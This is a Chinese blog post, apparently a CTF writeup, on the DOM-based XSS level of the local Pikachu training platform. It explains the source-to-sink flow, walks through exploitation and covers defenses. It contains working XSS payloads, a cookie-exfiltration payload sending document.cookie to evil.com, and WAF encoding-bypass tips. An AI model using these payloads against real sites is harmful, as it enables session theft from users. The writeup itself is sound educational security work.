---
layout: post
title: Pikachu - DOM型 XSS-X Writeup（源可控的真可利用版本）
platform: pikachu
date: 2026-10-26 22:32:00 +0800
categories: CTF
---

Pikachu - DOM型 XSS-X Writeup（源可控的真可利用版本）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Cross-Site Scripting → DOM型xss-x
- 地址：`http://localhost/pikachu/vul/xss/xss_dom_x.php`
- 题型：Web
- 考点：**DOM 型 XSS 的可利用版本**、URL 作为 Source、编码绕过

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**页面形态**：

```text
┌──────────────────────────────────────────────────────┐
│  [                          ] [请说出你的伤心往事]     │
│                                                      │
│  有些费尽心机想要忘记的事情,后来真的就忘掉了            │  ← 需要 text 参数才出现
│                                                      │
│  （注入的内容会显示在这里）                             │
└──────────────────────────────────────────────────────┘
```

**✅ 实测结果**

```text
★ 不带 text 参数：
    渲染出可点的链接了吗: False      ← 链接不出现
    JS 函数定义还在吗    : True       ← 函数始终存在

★ 带 text=hello：
    渲染出可点的链接了吗: True
    链接文字: 有些费尽心机想要忘记的事情,后来真的就忘掉了

★ 带 payload（?text='><img src=x onerror=alert(1)>）：
    响应里出现 payload 吗: False      ← ★ 服务端不反射
    渲染出可点的链接了吗: True
    → 点链接 → 弹窗 "1"
```

二、题目分析

**① 和上一关的唯一区别：换了一个"源"**

```javascript
// 第 4 关（DOM型xss，第 48 行）
var str = document.getElementById("text").value;      // 源 = 输入框（用户自己填）

// 第 5 关（DOM型xss-x，第 49 行）
var str = window.location.search;                     // 源 = URL 查询串 ★ 攻击者可控制
```

**★ 这一行改动，让漏洞从"自伤"变成了"可攻击他人"。**

**② 完整的 JS（4 行，逐行分析）**

```javascript
// xss_dom_x.php 第 48-55 行
function domxss(){
    var str  = window.location.search;                    // ① 拿 "?text=hello"
    var txss = decodeURIComponent(str.split("text=")[1]); // ② 切出 text= 后的值并解码
    var xss  = txss.replace(/\+/g, ' ');                  // ③ + 号换成空格
    document.getElementById("dom").innerHTML =
        "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";     // ④ 拼进 innerHTML（★ 漏洞）
}
```

**逐行拆**：

```
① location.search
     浏览器里就是 "?text=hello"
     如果 URL 是 ?a=1&text=hello → "?a=1&text=hello"

② str.split("text=")
     "?text=hello" → ["?", "hello"]
                              ↑ [1] 就是 "hello"
     decodeURIComponent("hello") → "hello"
     如果 URL 里是 %3Cscript%3E → 解码后变回 <script>

③ txss.replace(/\+/g, ' ')
     表单提交时，空格会被编码成 +（application/x-www-form-urlencoded）
     所以这里把 + 还原成空格

④ element.innerHTML = "<a href='"+xss+"'>..."
     ★ 没有转义、没有过滤
     ★ 上下文是 <a href=' 单引号 '>
```

**③ 函数是怎么被触发的（关键）**

**注意：`domxss()` **不是**自动执行的，而是被一个链接调用**：

```php
// xss_dom_x.php 第 20-23 行
$html = '';
if(isset($_GET['text'])){
    $html .= "<a href='#' onclick='domxss()'>有些费尽心机想要忘记的事情,后来真的就忘掉了</a>";
}
```

**★ 所以流程是**：

```
① 访问 ?text=xxx
        ↓
② PHP 检测到 text 参数存在 → 输出那个链接
        ↓
③ 用户点击链接
        ↓
④ onclick='domxss()' 触发
        ↓
⑤ domxss() 从 location.search 读取 text 的值
        ↓
⑥ 拼进 innerHTML → payload 执行
```

**★ 实测验证**：

```text
不带 text 参数 → 链接不出现（False）
带 text 参数   → 链接出现（True）
```

**④ 漏洞上下文：`<a href='PAYLOAD'>`**

```javascript
"<a href='" + xss + "'>就让往事都随风...</a>"
              └─┬─┘
          单引号包住你的输入
```

**★ payload 要闭合两个东西**：

```
① '   → 结束 href 属性
② >   → 结束 <a> 标签
```

**输入 `'><img src=x onerror=alert(1)>` 后**：

```html
<a href=''><img src=x onerror=alert(1)>'>就让往事都随风,都随风吧</a>
        └──┬──┘└──────────┬─────────┘
       空 href    注入的标签（自动执行）
```

**⑤ 为什么这一关"真能被利用"**

**关键在"源"的性质**：

| | 第 4 关（DOM型xss） | **第 5 关（DOM型xss-x）** |
|---|---|---|
| **源** | `input.value` | **`location.search`** |
| **谁能控制** | ❌ **只有使用者自己** | ✅ **攻击者（构造 URL）** |
| **攻击者能打别人吗** | ❌ 不能（Self-XSS）| ✅ **能** |
| **需要受害者做什么** | 自己输入 payload | **点一次链接** |
| **危害** | 无（自己害自己）| **真实可利用** |

**★ 一句话**：

```
第 4 关：你 XSS 你自己（没意义）
第 5 关：我构造链接，你点一下，我 XSS 你（有意义）
```

**⑥ 服务端仍然完全不参与**

**实测验证**：

```python
payload = "'><img src=x onerror=alert(1)>"
url = "http://localhost/pikachu/vul/xss/xss_dom_x.php?text=" + urllib.parse.quote(payload)
with urllib.request.urlopen(url) as r:
    body = r.read().decode("utf-8", "replace")

print("响应里出现 payload 吗:", payload in body)     # False
```

**输出**：

```text
响应里出现 payload 吗: False      ← ★ 服务端根本没输出它
```

**★ 所以**：

```
① 查看源代码（Ctrl+U）搜不到 payload
② 服务端日志里只有 ?text=%27%3E%3Cimg...
③ WAF 看到的请求里 payload 是 URL 编码的
④ 服务端返回的 HTML 是完全干净的
⑤ 是浏览器自己把 payload 拼进去的
```

三、解题步骤

**第 1 步：打开页面（先不带参数）**

```text
http://localhost/pikachu/vul/xss/xss_dom_x.php
```

**你会看到**：

```
[                    ] [请说出你的伤心往事]

（下面是空的，没有那个链接）
```

**★ 因为 `isset($_GET['text'])` 为 false，PHP 没有输出链接。**

**第 2 步：正常用一次（理解功能）**

```text
① 输入框里填：hello
② 点"请说出你的伤心往事"
③ 页面刷新，URL 变成：
     xss_dom_x.php?text=hello
④ 出现一行可点的链接：
     "有些费尽心机想要忘记的事情,后来真的就忘掉了"
⑤ 点它
⑥ 下方出现一个链接："就让往事都随风,都随风吧"
```

**★ 第 ⑤ 步的点击就是触发 `domxss()`。**

**第 3 步：注入（三种方式，任选）**

**方式 A：直接粘 URL（最快）**

```
http://localhost/pikachu/vul/xss/xss_dom_x.php?text=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

**★ 页面会显示那个链接 → 点它 → 弹窗 "1"**

**方式 B：在输入框里输入 payload**

```text
① 输入框里填：'><img src=x onerror=alert(1)>
② 点"请说出你的伤心往事"
③ 页面刷新（浏览器会把 payload 编码进 URL）
④ 点出现的那行链接
⑤ 弹窗
```

**★ 但注意：`split("text=")` 的解析可能对某些字符敏感（见下面延伸知识）**

**方式 C：用 DevTools 直接执行（调试用）**

```javascript
// F12 控制台
domxss()
```

**★ 前提是 URL 里已经有 text 参数。**

**第 4 步：验证 payload 有没有生效**

```text
① 访问带 payload 的 URL
② 点那行链接
③ 弹窗了吗？
④ 如果没弹 → F12 → 元素 → 看 <div id="dom"> 里的内容
```

**★ 元素面板里应该看到**：

```html
<div id="dom">
    <a href=''><img src=x onerror=alert(1)>'>就让往事都随风,都随风吧</a>
</div>
```

**★ 如果看到的是被转义的（`&lt;img`），说明浏览器或某处做了处理。**

**第 5 步：⭐ 验证"服务端不参与"（三种方法）**

**方法 1：查看源代码**

```text
① 带 payload 访问页面
② Ctrl + U
③ Ctrl + F 搜 "img src=x"
```

**结果**：

```
搜不到 ✅
★ 因为服务端只输出固定的那个链接，不输出 text 的值
```

**方法 2：看网络面板**

```text
① F12 → 网络 → 清空
② 点那个链接
③ 看有没有新请求
```

**结果**：

```
没有新请求 ✅
★ 纯前端操作
```

**方法 3：命令行验证**

```python
import urllib.request, urllib.parse
payload = "'><img src=x onerror=alert(1)>"
url = "http://localhost/pikachu/vul/xss/xss_dom_x.php?text=" + urllib.parse.quote(payload)
with urllib.request.urlopen(url) as r:
    body = r.read().decode("utf-8", "replace")
print("payload 出现:", payload in body)     # False
```

**第 6 步：构造"真实攻击场景"**

**★ 这是本关的核心价值 —— 想一想攻击者怎么用。**

```
攻击者在论坛/群聊里发一条消息：

    "看到一句话特别扎心，你看看：
     http://靶场/pikachu/vul/xss/xss_dom_x.php?text=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E"

受害者：
    ① 点开链接 → 页面加载（服务端返回干净页面）
    ② 看到一行"有些费尽心机想要忘记的事情..."
    ③ 好奇点了一下
    ④ domxss() 执行 → innerHTML 插入 payload
    ⑤ <img onerror> 触发 → JS 执行
    ⑥ 在真实攻击中，cookie 被发到攻击者服务器
```

**★ 受害者只做了两件事：点链接 + 点链接。（不需要输入任何东西）**

**第 7 步：换成更隐蔽的 payload**

**弹窗太明显，真实攻击用静默外带**：

```javascript
'><img src=x onerror="new Image().src='http://evil.com/?c='+document.cookie">
```

**URL 编码后**：

```
?text=%27%3E%3Cimg%20src%3Dx%20onerror%3D%22new%20Image%28%29.src%3D%27http%3A%2F%2Fevil.com%2F%3Fc%3D%27%2Bdocument.cookie%22%3E
```

**★ 受害者什么都看不到，cookie 已经发出去了。**

四、延伸知识

**① 四种常见的"URL 型 Source"**

| Source | 例子 | 会发到服务端吗 | 备注 |
|---|---|---|---|
| **`location.search`** | `?text=xxx` | ✅ 会 | 服务端日志/WAF 能看到 |
| **`location.hash`** | `#xxx` | ❌ **不会** | ★ 最隐蔽，服务端完全不知道 |
| `location.pathname` | `/xxx` | ✅ 会 | 需要路由支持 |
| `document.referrer` | 来源页 URL | ✅ 会（作为头部）| 可被伪造/为空 |
| `window.name` | 窗口名 | ❌ 不会 | 跨域也能保留，常用于绕过 |

**★ `location.hash` 最危险的原因**：

```text
访问：http://site.com/page#<img src=x onerror=alert(1)>

浏览器实际发送的请求：
    GET /page HTTP/1.1
    （# 后面的内容【根本不发送】）

★ 服务端日志里：GET /page —— 干干净净
★ WAF 看到的：GET /page —— 干净
★ 服务端返回：干净的页面
★ 然后浏览器自己从 hash 里取 payload 执行

★ 这就是"完全无痕"的 XSS
```

**② `decodeURIComponent` 的双刃剑**

**本关的代码**：

```javascript
var txss = decodeURIComponent(str.split("text=")[1]);
```

**★ 对攻击者来说，这是"免费的编码绕过"**：

```
假设网站有 WAF，会拦 <script>
    → 攻击者传 %3Cscript%3E
    → WAF 看到的是 %3Cscript%3E（不是 <script>）→ 放行
    → decodeURIComponent 解码 → <script>
    → 执行成功

★ 所以"URL 编码"本身就是一种绕过手法
★ 遇到 WAF 时第一个该试的就是编码
```

**常见的编码变体**：

```
一次编码：  %3Cscript%3E
两次编码：  %253Cscript%253E   （如果服务端会解码两次）
HTML 实体：  &lt;script&gt;     （如果插入到 HTML 上下文）
Unicode：   \u003cscript\u003e （如果在 JS 字符串上下文）
```

**③ `split("text=")[1]` 的解析 bug（真实代码里的常见问题）**

**测试这些 URL**：

```
① ?text=hello
   split → ["?", "hello"]
   [1] = "hello"                       ✅ 正常

② ?text=a&text=b
   split("text=") → ["?text=", "a&", "b"]
   [1] = "a&"                          ❌ 只取第一个，还被截断

③ ?other=text=xxx
   split → ["?other=", "xxx"]
   [1] = "xxx"                          ⚠️ 参数名不匹配也能取到

④ ?text=
   split → ["?", ""]
   [1] = ""                             ⚠️ 空字符串
```

**★ 如果 text 的值里本身含有 `text=`**：

```
?text=abc%20text%3Ddef
split 前：abc text=def（还没解码）
split("text=") → ["?text=", "abc ", "def"]
[1] = "abc "     ← ★ 值被截断了
```

**★ 正确的写法应该用 `URLSearchParams`**：

```javascript
// ✅ 正确
const params = new URLSearchParams(location.search);
const text = params.get('text');
```

**④ Source → Sink 的完整判定表**

**判定一个页面有没有 DOM 型 XSS，看这两列**：

| Source（入口） | 可控性 | 典型 Sink |
|---|---|---|
| `location.search` | ✅ 高 | `innerHTML` / `document.write` |
| `location.hash` | ✅ 高（且无痕）| 同上 |
| `location.href` | ✅ 高 | 同上 |
| `document.referrer` | ⚠️ 中 | 同上 |
| `window.name` | ✅ 高 | 同上 |
| `postMessage` 的 `e.data` | ✅ 高 | 同上 |
| `localStorage` | ⚠️ 中（需先污染）| 同上 |
| `<input>.value` | ❌ 低（Self-XSS）| 同上 |
| 硬编码字符串 | ❌ 无 | — |

**★ 判断口诀**：

```
源可控（攻击者能构造） + 汇危险（innerHTML/eval/document.write）
    = DOM 型 XSS（可利用）

源不可控（比如用户自己填的输入框）
    = Self-XSS（自己害自己，没意义）
```

**⑤ `innerHTML` 在这个上下文里为什么能执行**

**本关的 payload 是 `<img src=x onerror=alert(1)>`**：

```text
① innerHTML 把这段 HTML 插进 DOM
② <img> 标签被创建
③ src="x" 加载失败
④ 触发 onerror 事件
⑤ 执行 alert(1)
```

**★ 如果用 `<script>`**：

```html
'><script>alert(1)</script>
```

**★ 不会执行！**

**原因（HTML5 规范）**：

```
通过 innerHTML 插入的 <script> 标签：
    · 会被解析进 DOM
    · 但【不会执行】
    · 外链的 <script src> 也不会加载

这是浏览器的安全设计（防止动态插入时意外执行）
```

**★ 所以 DOM 型 XSS 的 payload 要用"事件处理器"**：

```html
<img src=x onerror=alert(1)>        ← onerror（加载失败时）
<svg onload=alert(1)>               ← onload（SVG 加载时）
<details open ontoggle=alert(1)>    ← ontoggle
<video><source onerror=alert(1)>    ← 多层结构
<iframe src="javascript:alert(1)">  ← javascript: 协议
```

**⑥ 真实的 DOM 型 XSS 漏洞（CVE 案例）**

**案例 1：jQuery `html()` / `$()`（CVE-2020-11022 / 11023）**

```javascript
// 危险代码
$('#msg').html(location.hash.slice(1));
// 或
$(location.hash)          // ★ jQuery 会把字符串当选择器/HTML 解析
```

**★ 影响**：

```
jQuery < 3.5.0 全部受影响
全球数百万网站
攻击：http://site.com/#<img src=x onerror=alert(1)>
```

**案例 2：Google 的 DOM XSS（2019）**

```
Google Search 的某个前端组件
把 location.hash 直接插入 innerHTML
→ 可通过构造链接执行任意 JS
→ 漏洞赏金 $5,000
```

**案例 3：信任 `postMessage`**

```javascript
// 危险代码
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
    // ★ 没有校验 e.origin
});

// 攻击：
// 攻击者的页面 iframe 嵌入目标站
// 然后 postMessage(payload, '*')
```

**⑦ 防御：五层**

**第一层：用 `textContent` 而不是 `innerHTML`**

```javascript
// ❌ 危险
element.innerHTML = userInput;

// ✅ 安全
element.textContent = userInput;
```

**第二层：必须用 HTML 时，用净化库**

```javascript
// DOMPurify（最流行）
element.innerHTML = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
});
```

**第三层：URL 参数白名单校验**

```javascript
// 如果只期望文本，就拒绝一切标签
function validateText(s) {
    if (/[<>"'`]/.test(s)) return '';
    return s;
}

// 如果期望 URL，只允许 http/https
function sanitizeUrl(s) {
    try {
        const u = new URL(s, location.origin);
        if (!['http:', 'https:'].includes(u.protocol)) return '#';
        return u.href;
    } catch { return '#'; }
}
```

**第四层：CSP（兜底）**

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               object-src 'none';
               base-uri 'none'">
```

**★ CSP 的效果**：

```
即使注入了 <img onerror=...>
如果 CSP 设了 script-src 'self' 且没有 'unsafe-inline'
→ 内联事件处理器会被拦
→ payload 不执行
```

**第五层：Trusted Types（现代方案）**

```javascript
// Chrome 支持
// CSP: require-trusted-types-for 'script';

element.innerHTML = TrustedHTML.createHTML(cleanInput);
// ★ 未经净化的字符串会被浏览器拒绝
```

**⑧ 两关 DOM 型的对比总结**

| | DOM型xss | **DOM型xss-x** |
|---|---|---|
| 源 | `input.value` | **`location.search`** |
| 攻击者能控制吗 | ❌ | ✅ |
| 需要受害者输入吗 | ✅ 需要 | ❌ **不需要** |
| 能构造恶意链接吗 | ❌ | ✅ |
| 真实危害 | Self-XSS | **可攻击他人** |
| 认知价值 | 理解 Source/Sink | **理解"源可控"的重要性** |

**★ 这一对关卡的用意**：

```text
同一段漏洞代码（innerHTML 拼接）
只是换了"数据从哪来"
→ 一个毫无危害（Self-XSS）
→ 一个真实可利用

★ 结论：DOM XSS 的危害 = 源的"可控性"
```

五、总结

- **本题核心：源从 `input.value` 换成了 `location.search`，漏洞从 Self-XSS 变成可利用的 DOM XSS。**

- **关键代码（4 行）**：

```javascript
var str  = window.location.search;                    // 源：URL
var txss = decodeURIComponent(str.split("text=")[1]); // 取值 + 解码
var xss  = txss.replace(/\+/g, ' ');                  // + 转空格
document.getElementById("dom").innerHTML =            // 汇：innerHTML
    "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
```

- **⭐ 五个必记要点**：

```text
① 源可控 + 汇危险 = 可利用的 DOM XSS
   → 源是 URL 就危险，源是用户自己填的输入框就只是 Self-XSS

② 攻击者只需要发一个链接
   → 受害者点链接 + 点页面上那个"扎心"的链接
   → 不需要输入任何东西

③ 服务端完全不参与（实测 payload 不出现在响应里）
   → Ctrl+U 看不到
   → WAF 拦不住
   → 服务端防护全部无效

④ decodeURIComponent 是"免费的编码绕过"
   → %3Cscript%3E 解码后就是 <script>
   → 遇到 WAF 先试编码

⑤ innerHTML 里的 <script> 不执行
   → 用 <img onerror> / <svg onload> 等事件处理器
```

- **实测数据**：

```text
不带 text 参数 → 链接不渲染（False），JS 函数仍在
带 text=hello → 链接渲染（True）

带 payload：
    响应里出现 payload: False     ← 服务端不反射
    链接正常渲染: True
    点链接 → 弹窗 "1"
```

- **攻击链（完整）**：

```text
攻击者构造 URL：
    http://靶场/.../xss_dom_x.php?text='><img src=x onerror=...>
        ↓
发给受害者（伪装成"扎心的一句话"）
        ↓
受害者点链接 → 页面加载（干净）
        ↓
受害者点页面上那行"有些费尽心机想要忘记的事情..."
        ↓
domxss() 读 URL → 拼 innerHTML → onerror 触发
        ↓
JS 执行 → cookie 外带
        ↓
★ 全程服务端无感知
```

- **XSS 模块进度**：

```text
✅ 反射型xss(get)      —— 直接拼接，需绕 maxlength
✅ 反射型xss(post)     —— 需登录 + 自动提交表单 + Pass-the-Hash
✅ 存储型xss           —— SQL 转义≠HTML 转义
✅ DOM型xss            —— 源=input（Self-XSS）
✅ DOM型xss-x          —— 本题：源=URL（真可利用）
⬜ xss之盲打           —— 后台触发
⬜ xss之过滤           —— 绕过过滤
⬜ xss之htmlspecialchars —— 防护演示
⬜ xss之href输出        —— 属性上下文
⬜ xss之js输出          —— JS 上下文
```

**手工复现要点**：

```text
· 打开 xss_dom_x.php（不带参数 → 没有链接）
· 带 ?text=hello → 链接出现 → 点它 → 显示"就让往事都随风"
· 换 ?text='><img src=x onerror=alert(1)> → 点链接 → 弹窗
· Ctrl+U 搜 payload → 找不到（服务端不参与）
· F12 元素 → 看到注入的 <img> 标签
· 试试 ?text='><script>alert(1)</script> → 不弹（innerHTML 限制）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  DOM XSS 的危害 = 源的"可控性"                               │
│                                                            │
│  源 = 输入框     → Self-XSS，只能害自己                       │
│  源 = URL        → 真可利用，构造链接就能打人                  │
│  源 = URL hash   → 最隐蔽（服务端日志里都看不到）               │
│                                                            │
│  ★ 服务端完全不知情 → 所有服务端防护失效                       │
│  ★ innerHTML 不执行 <script> → 用 onerror/onload             │
│  ★ decodeURIComponent → 免费的编码绕过                        │
└────────────────────────────────────────────────────────────┘
```
